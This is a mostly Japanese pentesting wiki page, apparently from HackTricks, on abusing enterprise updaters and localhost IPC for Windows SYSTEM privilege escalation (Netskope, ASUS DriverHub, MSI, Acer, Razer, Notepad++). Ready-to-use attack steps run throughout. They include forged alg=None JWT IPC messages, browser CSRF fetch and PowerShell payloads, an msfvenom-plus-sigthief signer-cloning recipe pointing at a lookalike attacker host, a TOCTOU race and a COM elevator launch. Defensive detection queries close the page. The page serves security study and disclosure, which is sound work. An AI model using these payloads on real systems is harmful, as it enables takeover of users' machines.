# Enterprise Auto-Updaters と Privileged IPC の悪用（例: Netskope, ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低摩擦な IPC 面と特権付き update フローを公開する enterprise endpoint agents および updaters に見られる、Windows local privilege escalation の一連の chain を一般化します。代表例は Netskope Client for Windows < R129 (CVE-2025-0309) で、低権限ユーザーが attacker-controlled server への enrollment を強制し、その後 SYSTEM service に malicious MSI をインストールさせることができます。

似た製品に対して再利用できる重要な考え方:
- privileged service の localhost IPC を悪用して、attacker server への再 enrollment や reconfiguration を強制する。
- vendor の update endpoints を実装し、rogue Trusted Root CA を配布し、updater を malicious な “signed” package に向ける。
- 弱い signer checks (CN allow-lists)、任意の digest flags、緩い MSI properties を回避する。
- IPC が “encrypted” でも、registry に保存された world-readable な machine identifiers から key/IV を導出する。
- service が caller を image path/process name で制限する場合は、allow-listed process に inject するか、suspended で spawn して minimal thread-context patch で DLL を bootstrap する。

---
## 1) localhost IPC を介して attacker server への enrollment を強制する

多くの agents は、localhost TCP 経由で JSON を使って SYSTEM service と通信する user-mode UI process を同梱しています。

Netskope で観測されたもの:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host（例: AddonUrl）を制御する claims を持つ JWT enrollment token を作成する。alg=None を使えば signature は不要。
2) あなたの JWT と tenant name を使って provisioning command を呼び出す IPC message を送信する:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のために rogue server にアクセスし始める。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- もし caller verification が path/name-based なら、allow-listed vendor binary から request を originate する（§4 を参照）。

---
## 2) update channel を hijacking して SYSTEM として code を run する

client があなたの server と talk するようになったら、expected endpoints を implement し、attacker MSI に steer する。typical sequence:

1) /v2/config/org/clientconfig → かなり短い updater interval を持つ JSON config を return する。例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → malicious MSI を指し示すメタデータと fake version を供給する。

現場でよく見られる common checks の bypass:
- Signer CN allow-list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” に等しいかだけを確認する場合がある。あなたの rogue CA はその CN の leaf を発行して MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という無害な MSI property を含める。install 時に enforcement はない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）で追加の cryptographic validation を無効化できる。

Result: SYSTEM service は
C:\ProgramData\Netskope\stAgent\data\*.msi
からあなたの MSI をインストールし、NT AUTHORITY\SYSTEM として arbitrary code を実行する。

---
## 3) encrypted IPC requests の偽造（存在する場合）

R127 では、Netskope は IPC JSON を encryptData フィールドで包み、それは Base64 のように見えた。reversing により、AES が registry values から導出された key/IV を使っていることが分かった。これらは任意の user から読み取れる:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers は encryption を再現し、standard user から valid な encrypted commands を送れる。一般的な tip: agent が突然 IPC を “encrypt” し始めたら、HKLM 配下の device ID、product GUID、install ID を material として探すこと。

---
## 4) IPC caller allow-lists の bypass（path/name checks）

一部のサービスは、TCP connection の PID を解決し、image path/name を Program Files 配下の allow-listed vendor binaries（例: stagentui.exe, bwansvc.exe, epdlp.exe）と比較して peer を認証しようとする。

実用的な bypass は 2 つ:
- allow-listed process（例: nsdiag.exe）への DLL injection と、その内部からの proxy IPC。
- CreateRemoteThread を使わずに allow-listed binary を suspended で起動し、あなたの proxy DLL を bootstrap する（§5 を参照）。これで driver-enforced tamper rules を満たす。

---
## 5) Tamper-protection に優しい injection: suspended process + NtContinue patch

製品は protected processes への handle から危険な rights を削るために、しばしば minifilter/OB callbacks driver（例: Stadrv）を同梱する:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限

これらの制約に従う reliable な user-mode loader:
1) CREATE_SUSPENDED 付きで vendor binary の CreateProcess を行う。
2) まだ許可されている handle を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または、既知の RIP で code を patch するなら THREAD_RESUME だけ）。
3) ntdll!NtContinue（または他の early で確実に mapped される thunk）を、あなたの DLL path で LoadLibraryW を呼び出し、その後戻る小さな stub で上書きする。
4) ResumeThread で in-process であなたの stub を実行させ、DLL を読み込む。

protected process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を一度も使っていない（自分で作成した）ため、driver の policy を満たす。

---
## 6) 実用ツール
- NachoVPN（Netskope plugin）は rogue CA、malicious MSI signing を自動化し、必要な endpoints を提供する: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate。
- UpSkope は、任意の（必要なら AES-encrypted な）IPC messages を作成し、allow-listed binary から発信させるための suspended-process injection を含む custom IPC client。

## 7) 未知の updater/IPC surface に対する高速 triage workflow

新しい endpoint agent や motherboard の “helper” suite に直面したとき、次の quick workflow だけで、privesc の有望な target かどうかを大抵見分けられる:

1) loopback listeners を列挙し、vendor processes にマップし直す:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補となる named pipes を列挙する:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers によって使用される registry-backed routing data を調査する:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint 名、JSON key、command ID を抽出する。packed Electron/.NET frontends は、しばしば完全な schema を漏らす:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 実際の trust predicate を探し、最終的にプロセスを起動する code path だけを見ないこと:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
優先して注目すべきパターン:
- `CryptQueryObject`/certificate parsing を `WinVerifyTrust` なしで行っている場合、通常は「certificate が存在する」が「certificate が trusted である」と扱われており、certificate cloning や他の fake-signer tricks が可能になります。
- `Origin`、`Referer`、download URLs、process names、signer CN に対する substring/suffix チェックは authentication ではありません。`contains(".vendor.com")` は、通常 attacker-controlled な lookalike domains で exploit 可能です。
- low-privileged な GUI が「the file is trusted」を決定し、SYSTEM broker がその結果だけを consume している場合、client-side の DLL/JS を patch するか reimplement すると boundary 全体を bypass できることがよくあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` に copy してから、その path から validate または schedule している場合は、直ちに TOCTOU replacement windows と、より弱い checks を持つ別の `ExecuteTask()` wrapper を公開している sibling plugin modules を test してください。

named-pipe-heavy な target では、PipeViewer は protocol を深く reverse する前に weak DACLs と remotely reachable pipes を素早く見つけるのに役立ちます。

target が caller を PID、image path、または process name のみで authenticate している場合、それは boundary ではなく speed bump と考えてください: legitimate client への inject、または allow-listed process から接続を行うだけで、server の checks を満たすことがよくあります。named pipes については特に、[client impersonation and pipe abuse に関するこのページ](named-pipe-client-impersonation.md) でこの primitive をより詳しく説明しています。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub は、https://driverhub.asus.com から来る browser calls を期待する 127.0.0.1:53000 上の user-mode HTTP service (ADU.exe) を ship しています。origin filter は単に `string_contains(".asus.com")` を Origin header と `/asus/v1.0/*` で exposed される download URLs に対して実行するだけです。そのため、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host はチェックを通過し、JavaScript から state-changing requests を発行できます。追加の bypass patterns については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照してください。

実践的な流れ:
1) `.asus.com` を埋め込んだ domain を register し、そこに malicious webpage を host します。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` の privileged endpoint（例: `Reboot`, `UpdateApp`）を call します。
3) handler が期待する JSON body を送信します – packed frontend JS が下の schema を示しています。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI でも、Origin ヘッダーを信頼済みの値に spoof すると成功する:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL, CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
一般的な教訓: “helper” スイートをリバースする際は、localhost TCP や named pipes だけで止まらないこと。`Elevator`、`Launcher`、`Updater`、`Utility` のような名前を持つ COM classes を確認し、特権サービスが実際に対象バイナリ自体を検証しているのか、それともパッチ可能な user-mode client DLL が計算した結果を単に信用しているだけなのかを確かめること。このパターンは Razer だけに限らない。高権限 broker が低権限側からの allow/deny 判定を取り込む split design は、どれも privesc surface 候補になる。

---
## 弱い updater 検証を悪用したリモート supply-chain hijack (WinGUp / Notepad++)

2025年6月から2025年12月の間、Notepad++ の update flow を支える hosting infrastructure を侵害した攻撃者は、選択した被害者に対してのみ malicious manifest を配信した。古い WinGUp ベースの updaters は update の真正性を完全には検証しなかったため、悪意ある XML response で client を attacker-controlled な URL にリダイレクトできた。client は HTTPS content を受け入れる一方で、信頼できる certificate chain とダウンロードされた installer の有効な PE signature の両方を強制しなかったため、被害者は trojanized された NSIS `update.exe` を取得して実行してしまった。

運用フロー（local exploit 不要）:
1. **Infrastructure interception**: CDN/hosting を侵害し、attacker metadata を含む update check に対して malicious download URL を返す。
2. **Trojanized NSIS**: installer は payload を fetch/execute し、2つの execution chain を悪用する:
- **Bring-your-own signed binary + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、その search path に malicious な `log.dll` を配置する。署名済み binary が実行されると、Windows は `log.dll` を sideload し、それが Chrysalis backdoor を decrypt して reflectively load する（静的検知を妨げるために Warbird-protected + API hashing を使用）。
- **Scripted shellcode injection**: NSIS はコンパイル済み Lua script を実行し、Win32 APIs（例: `EnumWindowStationsW`）を使って shellcode を inject し、Cobalt Strike Beacon を stage する。

あらゆる auto-updater に対する hardening/detection の教訓:
- ダウンロードされた installer の **certificate + signature verification** を強制する（vendor signer を pin し、CN/chain 不一致を拒否する）こと。また、update manifest 自体にも署名する（例: XMLDSig）。検証されない限り、manifest-controlled な redirects は block すること。
- **BYO signed binary sideloading** をダウンロード後の detection pivot として扱うこと: 署名済み vendor EXE が canonical install path 外の DLL 名を load した場合（例: Bitdefender が Temp/Downloads から `log.dll` を load する）、また updater が vendor 署名でない installer を temp に drop/execute した場合に alert する。
- この chain で観測された **malware-specific artifacts** を monitor すること（generic pivots として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への anomalous な `gup.exe` writes、Lua-driven shellcode injection stages。
- Notepad++ は v8.8.9 以降で WinGUp を強化した。返される XML は now signed (XMLDSig) され、newer builds は transport だけを信頼するのではなく、ダウンロードされた installer の certificate + signature verification を強制する。

<details>
<summary>Cortex XDR XQL – Bitdefender-署名済み EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> が Notepad++ 以外のインストーラを起動する</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、署名されていない manifest を受け入れる、または installer signers の pinning に失敗する任意の updater に一般化できる。つまり、network hijack + malicious installer + BYO-signed sideloading により、“trusted” updates を装った remote code execution が可能になる。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
